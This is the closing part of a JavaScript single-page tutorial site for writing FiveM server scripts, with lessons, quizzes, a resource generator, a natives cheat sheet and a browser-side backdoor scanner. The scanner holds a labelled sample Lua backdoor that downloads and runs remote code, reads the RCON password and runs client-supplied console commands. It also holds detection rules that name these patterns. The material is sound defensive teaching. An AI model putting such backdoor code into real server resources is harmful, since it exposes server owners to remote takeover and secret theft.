      '<header class="page-head"><p class="crumb"><a href="#home">lessons</a> / ' + pad(i + 1) + ' of ' + TOTAL + ' / ' + esc(L.group) + '</p><h1>' + esc(L.title) + '</h1>' +
      '<p class="lead">' + L.summary + '</p><div class="meta"><span>' + L.mins + ' min read</span>' +
      (progress.done[L.id] ? '<span class="ok">quiz passed</span>' : '<span>quiz not passed</span>') +
      '<a href="' + esc(L.docs[0].url) + '" target="_blank" rel="noopener">official doc page</a></div></header>' +
      secs + deeper + fw + task +
      '<div id="quizMount">' + quizHtml(L) + '</div>' + docs + pager + '</article>';
  }

  function bindLesson(L) {
    var mount = $('#quizMount');
    mount.addEventListener('change', function (e) {
      var inp = e.target; if (!inp.matches('input[type=radio]')) return;
      var st = quizState[L.id]; st.picks[+inp.getAttribute('data-q')] = +inp.value;
      mount.innerHTML = quizHtml(L);
      var again = document.getElementById(inp.id); if (again) again.focus();
    });
    mount.addEventListener('click', function (e) {
      var b = e.target.closest('[data-act]'); if (!b) return;
      var st = quizState[L.id];
      if (b.getAttribute('data-act') === 'check') {
        st.checked = true;
        var pass = L.quiz.every(function (q, qi) { return st.picks[qi] === q.answer; });
        if (pass && !progress.done[L.id]) { progress.done[L.id] = true; save(); toast('Lesson passed: ' + L.title); renderSide(current); }
        mount.innerHTML = quizHtml(L);
      } else {
        quizState[L.id] = freshQuiz(L);
        mount.innerHTML = quizHtml(L);
      }
    });
    var tb = document.querySelector('[data-task]');
    if (tb) tb.addEventListener('change', function () { progress.tasks[L.id] = tb.checked; save(); });
    if (L.id === 'security') bindScanner();
  }

  // ---------- backdoor scanner ----------
  var SAMPLE = [
    '-- Example: part of a "free" resource found online',
    'local cfg = { webhook = "https://discord.com/api/webhooks/000/xyz" }',
    '',
    'PerformHttpRequest("https://example.invalid/update", function(status, body)',
    '    if body then',
    '        assert(load(body))()',
    '    end',
    'end, "GET")',
    '',
    'local _0x1a2b = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64"',
    'local key = GetConvar("rcon_password", "")',
    '',
    'RegisterNetEvent("helpme:run", function(cmd)',
    '    ExecuteCommand(cmd)',
    'end)'
  ].join('\n');
  var RULES = [
    { re: /(?<![.:\w])load(?:string)?\s*\(/, sev: 'high', why: 'Runs a text string as Lua code. Fine in rare tools, but in a downloaded resource it is the classic way to execute hidden or downloaded code.' },
    { re: /\beval\s*\(|new\s+Function\s*\(/, sev: 'high', why: 'JavaScript that runs a string as code (eval / new Function).' },
    { re: /child_process|os\.execute|io\.popen/, sev: 'high', why: 'Runs operating-system commands on your server machine.' },
    { re: /add_principal|add_ace/, sev: 'high', why: 'Grants permissions from code. Permissions belong in server.cfg, not hidden inside a script.' },
    { re: /GetConvar\s*\(\s*["'](?:rcon_password|sv_licenseKey|mysql_connection_string|steam_webApiKey)/i, sev: 'high', why: 'Reads a secret (RCON password, license key, database connection). Check it is not sent anywhere.' },
    { re: /(?:\\x[0-9a-fA-F]{2}){6,}/, sev: 'medium', why: 'A run of \\x hex escapes: text hidden so you cannot read it. Common in obfuscated backdoors.' },
    { re: /(?:\\\d{2,3}){8,}/, sev: 'medium', why: 'A run of decimal escapes (\\80\\101...): hidden text.' },
    { re: /string\.char\s*\(\s*\d+(?:\s*,\s*\d+){7,}/, sev: 'medium', why: 'string.char with many numbers builds hidden text at runtime.' },
    { re: /\b_0x[0-9a-fA-F]{3,}\b/, sev: 'medium', why: 'Variable names like _0x1a2b are produced by obfuscators.' },
    { re: /[A-Za-z0-9+\/]{160,}={0,2}/, sev: 'medium', why: 'A very long base64-looking blob. Could be an image, or could be packed code.' },
    { re: /discord(?:app)?\.com\/api\/webhooks/, sev: 'medium', why: 'Sends data to a Discord webhook. Normal for logs, but check exactly what is sent.' },
    { re: /\b_G\s*\[/, sev: 'medium', why: 'Looks up globals by computed name, which hides which functions are called.' },
    { re: /PerformHttpRequest/, sev: 'info', why: 'Makes a web request. Fine for version checks and logs; make sure nothing it downloads is executed.' },
    { re: /ExecuteCommand\s*\(/, sev: 'info', why: 'Runs a console command. Make sure the command text never comes from a client event.' }
  ];
  function scan(text) {
    var out = [];
    var lines = text.split('\n');
    lines.forEach(function (line, i) {
      if (line.length > 600) out.push({ line: i + 1, sev: 'medium', why: 'Extremely long line (' + line.length + ' characters). Real code is rarely written on one line; obfuscated code often is.', snip: line.slice(0, 80) });
      RULES.forEach(function (r) { if (r.re.test(line)) out.push({ line: i + 1, sev: r.sev, why: r.why, snip: line.trim().slice(0, 120) }); });
    });
    if (/PerformHttpRequest/.test(text) && /(?<![.:\w])load(?:string)?\s*\(/.test(text)) {
      out.unshift({ line: 0, sev: 'high', why: 'This file both downloads with PerformHttpRequest and executes strings with load(). Together that is the signature of remote code execution: treat it as a backdoor until you have read every line.', snip: '' });
    }
    if (/RegisterNetEvent/.test(text) && /ExecuteCommand\s*\(/.test(text)) {
      out.push({ line: 0, sev: 'medium', why: 'Has network events and ExecuteCommand in the same file. Check that no client can pass a command string through an event.', snip: '' });
    }
    var rank = { high: 0, medium: 1, info: 2 };
    return out.sort(function (a, b) { return rank[a.sev] - rank[b.sev] || a.line - b.line; });
  }
  function scanResultsHtml(text) {
    if (!text.trim()) return '<p class="hint" style="padding:10px 0">Paste a .lua or .js file above, then press Scan file.</p>';
    var f = scan(text);
    if (!f.length) return '<p class="clean">No red flags found by these checks. That does not prove the file is safe, but nothing obvious stood out.</p>';
    var counts = { high: 0, medium: 0, info: 0 }; f.forEach(function (x) { counts[x.sev]++; });
    return '<p class="count" style="padding-bottom:6px;border-bottom:1px solid var(--line)">' + counts.high + ' high, ' + counts.medium + ' medium, ' + counts.info + ' info</p>' + f.map(function (x) {
      return '<div class="finding"><span class="sev ' + x.sev + '">' + x.sev + '</span><div><p>' + esc(x.why) + '</p>' +
        (x.line ? '<p class="hint">line ' + x.line + (x.snip ? ': <code>' + esc(x.snip) + '</code>' : '') + '</p>' : '<p class="hint">whole file</p>') + '</div></div>';
    }).join('');
  }
  function scannerHtml() {
    return '<section class="section" id="scanner"><h2>Backdoor scanner</h2>' +
      '<p class="lead" style="font-size:0.95rem">Paste a script file from a resource you downloaded. The check runs in your browser and nothing is uploaded. The file loaded below is a made-up example so you can see what gets flagged.</p>' +
      '<div class="editor"><div class="editor-bar"><div class="etabs"><span class="etab on">suspect.lua</span></div><div class="editor-tools"><span class="tag">paste here</span></div></div>' +
      '<label for="scanInput" class="label" style="position:absolute;left:-9999px">Code to scan</label><textarea class="input" id="scanInput" rows="13" spellcheck="false"></textarea></div>' +
      '<div class="actions"><button class="btn primary" id="scanBtn">Scan file</button><button class="btn" id="scanSample">Load example file</button><button class="btn" id="scanClear">Clear</button></div>' +
      '<div class="scan-results" id="scanOut"></div></section>';
  }
  function bindScanner() {
    var ta = $('#scanInput'), out = $('#scanOut');
    ta.value = SAMPLE;
    var run = function () { out.innerHTML = scanResultsHtml(ta.value); };
    run();
    $('#scanBtn').addEventListener('click', run);
    $('#scanSample').addEventListener('click', function () { ta.value = SAMPLE; run(); });
    $('#scanClear').addEventListener('click', function () { ta.value = ''; run(); ta.focus(); });
  }

  // ---------- generator ----------
  var genState = { name: 'coffee_shop', author: '', description: 'A shop counter with a menu', config: true, nui: true, cooldown: true, marker: true, tab: 0 };
  try { var gs = JSON.parse(localStorage.getItem(STORE_KEY + '-gen') || 'null'); if (gs && typeof gs.name === 'string') { for (var k in gs) genState[k] = gs[k]; } } catch (e) {}
  function validName(n) { return /^[a-z][a-z0-9_-]{1,31}$/.test(n); }
  function renderGenerator() {
    var opt = function (key, title, desc) {
      return '<label class="opt-toggle"><input type="checkbox" id="g-' + key + '" data-g="' + key + '"' + (genState[key] ? ' checked' : '') + '><b>' + title + '</b><span>' + desc + '</span></label>';
    };
    return '<div class="col wide"><header class="page-head"><p class="crumb">tools / generator</p><h1>Resource generator</h1>' +
      '<p class="lead">Type a name and pick the features your resource needs. Copy each file into <code>resources/[local]/yourname/</code>. The code follows the patterns from the lessons, with the checks on the server side.</p></header>' +
      '<div class="gen"><div class="form">' +
      '<div class="field"><label for="g-name">Resource name</label><input class="input mono" id="g-name" value="' + esc(genState.name) + '" autocomplete="off" spellcheck="false"><p class="hint" id="g-name-hint">Lowercase letters, numbers, _ or -. Becomes the folder name and event prefix.</p></div>' +
      '<div class="field"><label for="g-author">Author</label><input class="input" id="g-author" value="' + esc(genState.author) + '" placeholder="Your name"></div>' +
      '<div class="field"><label for="g-description">Description</label><input class="input" id="g-description" value="' + esc(genState.description) + '"></div>' +
      '<div class="field"><span class="lbl">Features</span><div class="opt-list">' +
      opt('config', 'Shared config', 'A config.lua loaded on client and server, so positions and prices live in one place.') +
      opt('nui', 'NUI menu', 'An HTML menu with buttons. Clicks are sent to the server as an option ID only.') +
      opt('cooldown', 'Server-side cooldown', 'The server refuses repeat uses within N seconds, per player.') +
      opt('marker', 'Marker with "press E"', 'A marker at a location; press E nearby to use it. The server re-checks distance.') +
      '</div></div></div><div class="out" id="genOut"></div></div></div>';
  }
  var genStoreBase = 0;
  function renderGenOut() {
    var ok = validName(genState.name);
    var nameInp = $('#g-name'), hint = $('#g-name-hint');
    nameInp.classList.toggle('invalid', !ok);
    hint.classList.toggle('err', !ok);
    hint.textContent = ok ? 'Lowercase letters, numbers, _ or -. Becomes the folder name and event prefix.' : 'Use 2 to 32 characters: start with a lowercase letter, then lowercase letters, numbers, _ or -.';
    var out = $('#genOut');
    if (!ok) { out.innerHTML = '<div class="empty">Fix the resource name to see your files.</div>'; return; }
    try { localStorage.setItem(STORE_KEY + '-gen', JSON.stringify(genState)); } catch (e) {}
    codeStore.length = genStoreBase; // drop copy buffers from the previous render
    var r = generateResource(genState);
    if (genState.tab >= r.files.length) genState.tab = 0;
    var f = r.files[genState.tab];
    var tabs = r.files.map(function (file, i) {
      var on = i === genState.tab;
      return '<button class="etab' + (on ? ' on' : '') + '" data-tab="' + i + '" role="tab" aria-selected="' + on + '">' + esc(file.path) + '</button>';
    }).join('');
    var allText = r.files.map(function (file) {
      var label = '===== ' + genState.name + '/' + file.path + ' =====';
      var head = file.lang === 'html' ? '<!-- ' + label + ' -->' : file.lang === 'css' ? '/* ' + label + ' */' : file.lang === 'js' ? '// ' + label : '-- ' + label;
      return head + '\n' + file.content;
    }).join('\n');
    var allId = codeStore.push(allText) - 1;
    var how = [
      'Create the folder <code>resources/[local]/' + esc(genState.name) + '</code> on your server.',
      'Create each file below with the same name and paste its contents (' + r.files.length + ' files' + (genState.nui ? ', including the <code>html</code> folder' : '') + ').',
      'Add the line to <code>server.cfg</code>, then run <code>refresh; ensure ' + esc(genState.name) + '</code> in the server console.',
      genState.marker ? 'In game, stand where you want the marker, run <code>/' + esc(genState.name) + '_coords</code>, and paste the result into ' + (genState.config ? '<code>config.lua</code>' : 'both <code>client.lua</code> and <code>server.lua</code>') + '.' : 'In game, type <code>/' + esc(genState.name) + '</code> to use it.',
      'Open the F8 console and run <code>resmon 1</code> to check the resource\'s CPU time.'
    ];
    out.innerHTML =
      '<div class="out-head"><p class="path">resources/[local]/<b>' + esc(genState.name) + '</b>/ <span class="count">' + r.files.length + ' files</span></p>' +
      '<button class="btn small" data-copy="' + allId + '">Copy all ' + r.files.length + ' files</button></div>' +
      codeBlock(f.content, f.lang, f.path, { tabs: tabs }) +
      '<div class="split">' + codeBlock(r.tree, 'text', 'folder layout') +
      '<div style="display:flex;flex-direction:column;gap:14px;min-width:0">' + codeBlock(r.cfg, 'cfg', 'server.cfg', { gutter: false }) +
      '<div class="block" style="gap:8px"><h2 class="h" style="font-size:1.05rem">Install</h2><ol class="steps">' + how.map(function (s) { return '<li>' + s + '</li>'; }).join('') + '</ol></div></div></div>';
    // keep the open file's tab visible when the strip is scrolled
    var onTab = out.querySelector('.etab.on');
    if (onTab) { var strip = onTab.parentNode; if (onTab.offsetLeft + onTab.offsetWidth > strip.scrollLeft + strip.clientWidth || onTab.offsetLeft < strip.scrollLeft) strip.scrollLeft = Math.max(0, onTab.offsetLeft - 24); }
  }
  function bindGenerator() {
    genStoreBase = codeStore.length;
    ['name', 'author', 'description'].forEach(function (k) {
      $('#g-' + k).addEventListener('input', function (e) { genState[k] = k === 'name' ? e.target.value.trim() : e.target.value; renderGenOut(); });
    });
    document.querySelectorAll('[data-g]').forEach(function (cb) {
      cb.addEventListener('change', function () { genState[cb.getAttribute('data-g')] = cb.checked; renderGenOut(); });
    });
    $('#genOut').addEventListener('click', function (e) {
      var t = e.target.closest('[data-tab]'); if (!t) return;
      genState.tab = +t.getAttribute('data-tab'); renderGenOut();
      var again = document.querySelector('[data-tab="' + genState.tab + '"]'); if (again) again.focus();
    });
    renderGenOut();
  }

  // ---------- cheat sheet ----------
  var natState = { q: '', side: 'all', cat: 'all' };
  var CATS = []; DATA.natives.forEach(function (n) { if (CATS.indexOf(n.c) < 0) CATS.push(n.c); });
  function renderNatives() {
    var seg = [['all', 'all'], ['client', 'client'], ['server', 'server'], ['both', 'both']].map(function (s) {
      return '<button data-side="' + s[0] + '" class="' + (natState.side === s[0] ? 'on' : '') + '" aria-pressed="' + (natState.side === s[0]) + '">' + s[1] + '</button>';
    }).join('');
    return '<div class="col wide"><header class="page-head"><p class="crumb">tools / natives</p><h1>Native cheat sheet</h1>' +
      '<p class="lead">The natives and runtime functions RP scripts use most. Names link to the official Native Reference. Where a native exists on both sides with different arguments, both signatures are shown.</p></header>' +
      '<div class="filters"><input class="input" id="natQ" type="search" placeholder="Search: vehicle, blip, coords, event" value="' + esc(natState.q) + '" aria-label="Search natives">' +
      '<div class="seg" role="group" aria-label="Filter by side">' + seg + '</div>' +
      '<select class="input" id="natCat" aria-label="Filter by category"><option value="all">All categories</option>' + CATS.map(function (c) { return '<option' + (natState.cat === c ? ' selected' : '') + '>' + esc(c) + '</option>'; }).join('') + '</select></div>' +
      '<div id="natOut"></div></div>';
  }
  function renderNatOut() {
    var q = natState.q.toLowerCase().trim();
    var rows = DATA.natives.filter(function (n) {
      if (natState.side !== 'all' && n.s !== natState.side) return false;
      if (natState.cat !== 'all' && n.c !== natState.cat) return false;
      if (!q) return true;
      return (n.n + ' ' + n.c + ' ' + n.d + ' ' + (n.up || '')).toLowerCase().indexOf(q) >= 0;
    });
    var body = rows.map(function (n) {
      var sig = '';
      if (n.sig) {
        var keys = Object.keys(n.sig);
        sig = keys.map(function (k) { return '<span class="sig">' + (keys.length > 1 ? '<b>' + k + ':</b> ' : '') + esc(n.sig[k]) + '</span>'; }).join('');
      }
      return '<tr><td><span class="nat-name"><a href="' + esc(n.u) + '" target="_blank" rel="noopener">' + esc(n.n) + '</a></span>' + (n.rt ? '<span class="rt">Lua runtime function</span>' : '') + '</td>' +
        '<td><span class="tag">' + n.s + '</span></td><td class="cat">' + esc(n.c) + '</td>' +
        '<td>' + esc(n.d) + sig + '</td><td><span class="ex">' + esc(n.e) + '</span></td></tr>';
    }).join('');
    $('#natOut').innerHTML = '<p class="count" style="margin:0 0 8px">' + rows.length + ' of ' + DATA.natives.length + ' shown</p>' +
      (rows.length ? '<div class="table-wrap"><table class="nat-table"><thead><tr><th>Name</th><th>Side</th><th>Category</th><th>What it does</th><th>Example</th></tr></thead><tbody>' + body + '</tbody></table></div>'
        : '<div class="empty">Nothing matches. Try a shorter word, or set the side filter back to all.</div>');
  }
  function bindNatives() {
    $('#natQ').addEventListener('input', function (e) { natState.q = e.target.value; renderNatOut(); });
    $('#natCat').addEventListener('change', function (e) { natState.cat = e.target.value; renderNatOut(); });
    document.querySelectorAll('[data-side]').forEach(function (b) {
      b.addEventListener('click', function () {
        natState.side = b.getAttribute('data-side');
        document.querySelectorAll('[data-side]').forEach(function (x) { x.classList.toggle('on', x === b); x.setAttribute('aria-pressed', String(x === b)); });
        renderNatOut();
      });
    });
    renderNatOut();
  }

  // ---------- router ----------
  var current = { view: 'home' };
  function parseRoute() {
    var h = (location.hash || '').replace(/^#/, '');
    if (h.indexOf('lesson-') === 0) { var id = h.slice(7); if (LESSONS.some(function (l) { return l.id === id; })) return { view: 'lesson', id: id }; }
    if (h === 'security') return { view: 'security', id: 'security' };
    if (h === 'generator' || h === 'natives') return { view: h };
    return { view: 'home' };
  }
  function render() {
    current = parseRoute();
    codeStore = [];
    var main = $('#main');
    var lessonId = current.view === 'lesson' || current.view === 'security' ? current.id : null;
    renderSide({ view: current.view, id: lessonId });
    if (lessonId) {
      var L = LESSONS.find(function (l) { return l.id === lessonId; });
      main.innerHTML = renderLesson(L); bindLesson(L);
      document.title = L.title + ' · FiveM Script Garage';
      if (current.view === 'security') { var sc = $('#scanner'); if (sc) { sc.scrollIntoView(); closeNav(); return; } }
    } else if (current.view === 'generator') { main.innerHTML = renderGenerator(); bindGenerator(); document.title = 'Resource generator · FiveM Script Garage'; }
    else if (current.view === 'natives') { main.innerHTML = renderNatives(); bindNatives(); document.title = 'Native cheat sheet · FiveM Script Garage'; }
    else { main.innerHTML = renderHome(); bindHome(); document.title = 'FiveM Script Garage'; }
    closeNav();
    window.scrollTo(0, 0);
  }
  function closeNav() { document.body.classList.remove('nav-open'); $('#menuBtn').setAttribute('aria-expanded', 'false'); }
  window.addEventListener('hashchange', render);
  $('#menuBtn').addEventListener('click', function () {
    var open = document.body.classList.toggle('nav-open');
    $('#menuBtn').setAttribute('aria-expanded', String(open));
  });
  $('#scrim').addEventListener('click', closeNav);
  // tapping the page you are already on fires no hashchange, so close the drawer here too
  $('#side').addEventListener('click', function (e) { if (e.target.closest('a[href^="#"]')) closeNav(); });
  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeNav(); });
  render();
})();
</script>
</body>
</html>
